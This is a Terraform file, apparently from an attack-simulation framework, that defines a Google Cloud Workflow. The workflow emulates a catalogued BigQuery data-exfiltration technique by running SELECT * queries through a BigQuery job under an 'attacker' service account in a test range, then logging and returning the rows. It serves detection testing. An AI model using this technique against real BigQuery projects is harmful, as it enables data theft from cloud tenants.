data "google_service_account" "derf_attacker_sa_01" {
  account_id   = "derf-attacker-sa-01" 
  project      =  var.gcp_derf_project_id

}

data "google_client_config" "current" {
}


resource "google_workflows_workflow" "workflow_to_invoke_bq_data_exfiltration_via_job_attack" {
  name            = "gcp-bq-data-exfilration-via-job-toc"
  description     = "A workflow intended to execute Bigquery.T9 from the TrustOnCloud Threat Calalog for BigQuery, refer to: https://controlcatalog.trustoncloud.com/dashboard/gcp/bigquery#Threat%20Catalog?Bigquery.T9"
  service_account = data.google_service_account.derf_attacker_sa_01.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################
## This attack technique exfiltrates data from a Bigquery table through a SQL query executed
## via a Bigquery job. Permissions required to perform this technique are: "bigquery.jobs.create"
## and "bigquery.tables.getData"

#####################################################################################
## Input
######################################################################################
##### None. Will always run as Service Account 1 in the Target Project


######################################################################################
## User Agent
######################################################################################
#### Excutes with User-Agent: "Derf-GCP-BQ-Data-Exfil-Via-Job-WORKFLOWEXECUTIONID"

######################################################################################
## Infrastructure
######################################################################################
#### None created specifically for this module.  A Bigquery dataset and table are 
#### pre-populated into the target Google Project as a part of the perpetual range.


######################################################################################
## Main Workflow Execution
######################################################################################
main:
  steps:
    - assign:
        assign:
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}
    - InsertData:
        call: InsertData
        result: response
    - ExfiltrateData:
        call: ExfiltrateData
        result: response
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################

InsertData:
  steps:
    - insertData:
        call: googleapis.bigquery.v2.jobs.insert
        args:
          projectId: ${var.gcp_derf_project_id}
          body:
            configuration:
              query:
                useLegacySql: false
                query: INSERT INTO `derf-target-dev.derf_dataset.derf_table1` (fullVisitorId, visitNumber, visitId, visitStartTime, fullDate) VALUES ("${random_string.fullVisitorId.id}", ${random_string.longDigits.id}, ${random_string.longDigits.id}, ${random_string.longDigits.id}, "1970-01-${random_string.digits.id}")
        result: insertResult

    - return:
        return: insertResult

ExfiltrateData:
  steps:
    - init:
        assign:
          - pageToken: null
    - ExfiltrateData:
        call: googleapis.bigquery.v2.jobs.insert
        args:
          projectId: ${var.gcp_derf_project_id}
          body:
            configuration:
              query:
                useLegacySql: false
                query: SELECT * FROM `derf_dataset.derf_table1` LIMIT 50
        result: queryResult

    - getPage:
        call: googleapis.bigquery.v2.jobs.getQueryResults
        args:
          projectId: ${var.gcp_derf_project_id}
          jobId: $${queryResult.jobReference.jobId}
          maxResults: 10
          pageToken: $${pageToken}
        result: page
    - processPage:
        for:
          value: row
          in: $${page.rows}
          steps:
            - processRow:
                call: sys.log
                args:
                  data: $${row}
    - checkIfDone:
        switch:
          - condition: $${"pageToken" in page and page.pageToken != ""}
            assign:
              - pageToken: $${page.pageToken}
            next: getPage

    - return:
        return:
            - "SUCCESS | Bigquery Exfiltrate data via Job Insert - TrustOnCloud Threat: Bigquery.T9" 
            - "Exfiltrated Data: " 
            - $${page.rows}


  EOF

}
